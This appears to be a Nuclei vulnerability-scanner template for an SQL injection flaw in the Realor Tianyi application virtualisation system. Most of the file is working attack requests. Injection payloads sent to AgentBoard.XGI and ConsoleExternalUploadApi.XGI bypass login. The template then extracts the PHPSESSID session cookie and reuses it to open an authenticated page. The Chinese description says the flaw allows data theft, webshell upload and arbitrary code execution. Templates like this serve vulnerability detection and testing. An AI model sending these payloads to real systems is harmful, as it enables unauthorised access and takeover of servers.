http:
- extractors:
  - group: 1
    internal: true
    name: cookie
    part: header
    regex:
    - PHPSESSID=(.*?);
    type: regex
  matchers:
  - condition: and
    dsl:
    - "contains(body_1,\"\u672A\u67E5\u8BE2\u5230\u7B26\u5408\u6761\u4EF6\u7684\u7528\
      \u6237\") || (contains(body_2,\"CustomInfo\") && contains(header_2,\"PHPSESSID\"\
      ))"
    - contains(body_3,"src=\"custom/")
    type: dsl
  raw:
  - 'GET /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /AgentBoard.XGI?user=''||''1&cmd=UserLogin HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /Board.XGI HTTP/1.1

    Cookie: PHPSESSID={{cookie}}

    Host: {{Hostname}}

    '
id: realor-gwt-system-sql-injection
info:
  author: SleepingBag945
  description: "\u745E\u53CB\u5929\u7FFC\u5E94\u7528\u865A\u62DF\u5316\u7CFB\u7EDF\
    \u7531\u4E8E\u5BF9\u7528\u6237\u4F20\u5165\u7684\u6570\u636E\u5B89\u5168\u5904\
    \u7406\u4E0D\u5F53\uFF0C\u5BFC\u81F4\u5B58\u5728 SQL \u6CE8\u5165\u6F0F\u6D1E\uFF0C\
    \u8FDC\u7A0B\u4E14\u672A\u7ECF\u8FC7\u6388\u6743\u8BA4\u8BC1\u7684\u653B\u51FB\
    \u8005\u53EF\u5229\u7528\u6B64\u6F0F\u6D1E\u83B7\u53D6\u6570\u636E\u5E93\u91CC\
    \u654F\u611F\u4FE1\u606F\uFF0C\u4E5F\u53EF\u8FDB\u4E00\u6B65\u5199\u5165 webshell\
    \ \u540E\u95E8\u8BBF\u95EE\uFF0C\u653B\u51FB\u8005\u4ECE\u800C\u53EF\u5728\u76EE\
    \u6807\u670D\u52A1\u5668\u4E0A\u6267\u884C\u4EFB\u610F\u6076\u610F\u4EE3\u7801\
    \uFF0C\u83B7\u53D6\u7CFB\u7EDF\u6743\u9650\u3002"
  name: "\u745E\u53CB\u5929\u7FFC\u5E94\u7528\u865A\u62DF\u5316\u7CFB\u7EDF\u8FDC\u7A0B\
    \u4EE3\u7801\u6F0F\u6D1E"
  severity: critical
  tags: realor,sqli
